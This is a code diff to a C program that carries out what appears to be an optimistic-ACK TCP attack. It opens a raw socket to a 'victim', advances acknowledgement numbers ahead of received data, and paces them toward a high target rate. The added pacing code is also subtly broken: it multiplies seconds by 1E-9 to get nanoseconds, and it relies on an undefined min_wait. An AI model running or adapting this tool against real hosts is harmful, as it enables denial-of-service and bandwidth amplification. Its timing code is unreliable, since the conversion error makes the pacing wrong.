@@ -4,6 +4,7 @@
 #include <string.h>
 #include <unistd.h>
 #include <time.h>
+#include <sys/time.h>
 
 //Socket stuff
 #include <sys/socket.h>
@@ -44,6 +45,13 @@ struct victim_connection {
   unsigned is_done;        // if a fin packet was received, it will be 1
   unsigned short window;         // the current window size
 };
+
+double d_max(double a, double b) {
+    if (a > b)
+      return a;
+    return b;
+}
+
 
 // TODO I DONT THINK THIS IS NECESSARY
 //Debug function: dump 'index' bytes beginning at 'buffer'
@@ -265,13 +273,15 @@ void handshake(struct victim_connection *m_victim, int sock) {
 
 }
 
-int beginAttack(int duration) {
+int beginAttack(int duration, double target_rate) {
 
     // local variables
     int sock;
     struct victim_connection m_victim;  // TODO THIS ASSUMES ONE VICTIM
+    double curr_rate = target_rate / 10;
 
     // TODO Implement
+    int nbr_connections = 1;
 
     // Open the socket
     if((sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) < 0) {
@@ -297,20 +307,22 @@ int beginAttack(int duration) {
     // Begin the pace thread to observe overruns
     // TODO
 
-    time_t start_time;
-    time(&start_time);
-
-    time_t current_time;
-    time(&current_time);
     // begin the real attack
 
-    while (current_time - start_time <= duration) {
+    struct timeval start_time, current_time;
+    gettimeofday(&start_time, NULL);
+    gettimeofday(&current_time, NULL);
+
+    while (current_time.tv_sec - start_time.tv_sec <= duration) {
       // See if the attack should stop
 
       if (m_victim.had_overrun) {
         m_victim.last_sent_ack = m_victim.overrun_ack;
         m_victim.had_overrun = 0;
       }
+
+      struct timeval before_sent, after_sent;
+      gettimeofday(&before_sent, NULL);
 
       // Go through each connection and send the next ack
 
@@ -327,23 +339,38 @@ int beginAttack(int duration) {
                   5840,                       // window
                   0);                         // w_scale
 
+      gettimeofday(&after_sent, NULL);
+
       // for each connection increment the ack by the window size
       m_victim.last_sent_ack += m_victim.window;
 
       // TODO go to sleep for the right amount of time
-      sleep(1);   // This is temporary
+      double elapsed_seconds = (after_sent.tv_sec - before_sent.tv_sec) +
+                        1.0e-6 * (after_sent.tv_usec - before_sent.tv_usec);
+
+      double secsToWait = d_max(min_wait,
+                          m_victim.window / (curr_rate * nbr_connections));
+
+      secsToWait -= elapsed_seconds;
+
+      if (secsToWait > 0) {
+          struct timespec rgtp;
+          double nanoToWait = secsToWait * 1E-9;
+          rgtp.tv_sec = 0;
+          rgtp.tv_nsec = nanoToWait;
+          nanosleep(&rgtp, NULL);
+      }
 
       // increase the window size by mss as long as its less than the max
       if (m_victim.window < maxwindow) {
           m_victim.window += MSS;
       }
 
-      /*
       if (curr_rate < target_rate) {
           curr_rate += target_rate / 100;
       }
-      */
-      time(&current_time);
+
+      gettimeofday(&current_time, NULL);
     }
     // Cleanup send the fin packet since we cannot call RST
 
@@ -367,7 +394,8 @@ int beginAttack(int duration) {
 
 int main(int argc, char const *argv[]) {
   printf("In Main: About to begin:");
-  beginAttack(30);
+  // TODO, more arguments will be provided as the ip and ports of victims
+  beginAttack(30, 11250000.0);
 
   return 0;
 }
